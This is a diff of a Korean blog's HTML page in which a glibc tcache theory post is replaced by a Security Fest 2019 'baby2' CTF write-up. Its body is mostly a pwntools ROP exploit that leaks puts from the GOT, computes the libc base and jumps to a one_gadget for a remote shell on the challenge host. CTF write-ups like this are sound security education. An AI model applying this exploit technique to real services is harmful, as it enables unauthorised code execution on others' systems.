@@ -6,28 +6,28 @@
     
 
     
-    <title>Tcache Theory Analysis | j0n9hyun</title>
+    <title>Security Fest 2019 baby2 | j0n9hyun</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="Theory">
+        <meta name="keywords" content="WriteUps,CTF">
     
-    <meta name="description" content="Tcache 12345678910111213141516171819202122#if USE_TCACHE/* We overlay this structure on the user-data portion of a chunk when   the chunk is stored in the per-thread cache.  */typedef struct tcache_e">
-<meta name="keywords" content="Theory">
+    <meta name="description" content="Baby2 기본 ROP 문제 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process(&apos;./baby2&apos;)r = remote(&apos;">
+<meta name="keywords" content="WriteUps,CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tcache Theory Analysis">
-<meta property="og:url" content="http://j0n9hyun.github.io/2019/03/19/tcache_theory/index.html">
+<meta property="og:title" content="Security Fest 2019 baby2">
+<meta property="og:url" content="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Tcache 12345678910111213141516171819202122#if USE_TCACHE/* We overlay this structure on the user-data portion of a chunk when   the chunk is stored in the per-thread cache.  */typedef struct tcache_e">
+<meta property="og:description" content="Baby2 기본 ROP 문제 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process(&apos;./baby2&apos;)r = remote(&apos;">
 <meta property="og:locale" content="ko">
-<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58037363-3eaf4580-7b68-11e9-9dec-a36a43808625.PNG">
-<meta property="og:updated_time" content="2019-05-22T07:49:40.692Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG">
+<meta property="og:updated_time" content="2019-05-24T00:32:13.136Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tcache Theory Analysis">
-<meta name="twitter:description" content="Tcache 12345678910111213141516171819202122#if USE_TCACHE/* We overlay this structure on the user-data portion of a chunk when   the chunk is stored in the per-thread cache.  */typedef struct tcache_e">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58037363-3eaf4580-7b68-11e9-9dec-a36a43808625.PNG">
+<meta name="twitter:title" content="Security Fest 2019 baby2">
+<meta name="twitter:description" content="Baby2 기본 ROP 문제 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process(&apos;./baby2&apos;)r = remote(&apos;">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG">
     
-	<link rel="canonical" href="http://j0n9hyun.github.io/2019/03/19/tcache_theory/">
+	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/24/security-fest-2019-baby2/">
 
     
 
@@ -139,19 +139,19 @@
                         <div class="main-body-header">
     <h1 class="header">
     
-    <a class="page-title-link" href="/categories/Theory/">Theory</a>
+    <a class="page-title-link" href="/categories/WriteUps/">WriteUps</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/WriteUps/Pwn/">Pwn</a>
     </h1>
 </div>
 
                         <div class="main-body-content">
-                            <article id="post-tcache_theory" class="article article-single article-type-post" itemscope itemprop="blogPost">
+                            <article id="post-Security-Fest-2019-baby2" class="article article-single article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        Tcache Theory Analysis
+        Security Fest 2019 baby2
         </h1>
     
 
@@ -161,8 +161,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2019/03/19/tcache_theory/" class="article-date">
-            <time datetime="2019-03-19T01:21:00.000Z" itemprop="datePublished">2019-03-19</time>
+        <a href="/2019/05/24/Security-Fest-2019-baby2/" class="article-date">
+            <time datetime="2019-05-24T00:03:43.000Z" itemprop="datePublished">2019-05-24</time>
         </a>
     </div>
 
@@ -171,55 +171,35 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/Theory/">Theory</a>
+        <a class="tag-link" href="/tags/CTF/">CTF</a>, <a class="tag-link" href="/tags/WriteUps/">WriteUps</a>
     </div>
 
-  			<span class="reading-time">⏱ 5 분</span>
+  			<span class="reading-time">⏱ 3 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
-            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="tcache"><a class="markdownIt-Anchor" href="#tcache"></a> Tcache</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
-<center><small>[tcache_entry]</small></center>
-<p>Ubuntu 17.04 에서 glibc 2.6 버전이 릴리즈 되었는데 <strong>tcache_entry</strong>와 <strong>tcache_perthread_struct</strong>라는 구조체가 새로 추가되었다.</p>
-<h3 id="특징-br"><a class="markdownIt-Anchor" href="#특징-br"></a> 특징 <br></h3>
-<ul>
-<li>Single linked list(단일 연결 구조)를 이루고 있다.</li>
-<li>Consolidate를 하지 않는다.</li>
-<li>LIFO 구조를 가지고 있다.</li>
-<li>Pointer가 오직 next chunk만 포함하고 있다.</li>
-<li>기본적으로 Chunk Size는 24 ~ 1032 bytes 이다. (32bit : 12 ~ 516 bytes)</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure>
-<p>tcache bin 한 개당 기본적으로 7개의 Chunk를 가질 수 있다.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<center><small>[tcache_put]</small></center>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<center><small>[tcache_get]</small></center>
-<p><strong>tcache_put</strong>과 <strong>tcache_get</strong> 함수는 _int_free 와 __libc_malloc 함수가 시작할때 호출된다.<br>
-<strong>tacace_get</strong>은 할당된 크기의 영역이 요청될때 0x408보다 작으면 호출된다.</p>
-<p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037363-3eaf4580-7b68-11e9-9dec-a36a43808625.PNG"> <br></p>
-<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037374-41119f80-7b68-11e9-8533-5a9f1d95e084.PNG">
-<center><small>[free]</small></center>
-<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037376-41aa3600-7b68-11e9-97e6-41660941aa5c.PNG">
-<center><small>[한번 더 free]</small></center>
-entry와 count가 보이는 것을 알 수 있다. <br> <br>
+            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3>
+<p><code>기본 ROP 문제</code></p>
+<p>우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="내부 인스트럭션에서 조금 차이가 있는 듯하다. [참고](https://kong.re.kr/?p=335)">[1]</span></a></sup> <small> (일단 난 잘됨) </small></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./baby2')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10002</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(puts_got)</span><br><span class="line">p += p64(puts_plt)</span><br><span class="line">p += p64(main) </span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - puts_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">'input: '</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>
+<center><small>[Exploit Code]</small></center> <br>
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG">
+<center><small>[Remote]</small></center> <br>
 <style>
   img.border-shadow{
-      border:1px solid #888888;
-      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-  }
+        border:1px solid #888888;
+        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+    }
 </style>
-
+<div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">내부 인스트럭션에서 조금 차이가 있는 듯하다. <a href="https://kong.re.kr/?p=335" target="_blank" rel="noopener">참고</a><a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>
         </div>
         <footer class="article-footer">
             
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/03/19/tcache_theory/" data-id="cjw1bp4lq001fxrfpgz4e763w" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/" data-id="cjw1bp4ju0004xrfpbaqqp0me" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -289,17 +269,19 @@ entry와 count가 보이는 것을 알 수 있다. <br> <br>
             "@type": "Person",
             "name": "j0n9hyun"
         },
-        "headline": "Tcache Theory Analysis",
-        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/58037363-3eaf4580-7b68-11e9-9dec-a36a43808625.PNG",
-        "keywords": "Theory",
-        "genre": "Theory",
-        "datePublished": "2019-03-19",
-        "dateCreated": "2019-03-19",
-        "dateModified": "2019-05-22",
-        "url": "http://j0n9hyun.github.io/2019/03/19/tcache_theory/",
-        "description": " Tcache
-12345678910111213141516171819202122#if USE_TCACHE/* We overlay this structure on the user-data portion of a chunk when   the chunk is stored in the per-thread cache.  */typedef struct tcache_e"
-        "wordCount": 571
+        "headline": "Security Fest 2019 baby2",
+        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG",
+        "keywords": "WriteUps CTF",
+        "genre": "WriteUps Pwn",
+        "datePublished": "2019-05-24",
+        "dateCreated": "2019-05-24",
+        "dateModified": "2019-05-24",
+        "url": "http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/",
+        "description": " Baby2
+기본 ROP 문제
+우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨) 
+12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process('./baby2')r = remote('"
+        "wordCount": 321
     }
 </script>
 
@@ -355,20 +337,10 @@ entry와 count가 보이는 것을 알 수 있다. <br> <br>
         
 <nav id="article-nav">
     
-        <a href="/2019/03/25/securinets_welcome/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">다음 글</strong>
-        <p class="article-nav-title">
-        
-            Securinets Prequals CTF 2019 Welcome
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2019/03/05/warm_heap/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2019/05/05/doesnt_contain_k_integer/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">이전 글</strong>
-        <p class="article-nav-title">Warm Heap</p>
+        <p class="article-nav-title">ALLMN CTF 2019 Doesn&#39;t contain K integer</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -478,7 +450,7 @@ entry와 count가 보이는 것을 알 수 있다. <br> <br>
     var disqus_shortname = 'j0n9hyun';
     
     
-    var disqus_url = 'http://j0n9hyun.github.io/2019/03/19/tcache_theory/';
+    var disqus_url = 'http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/';
     
     (function() {
     var dsq = document.createElement('script');
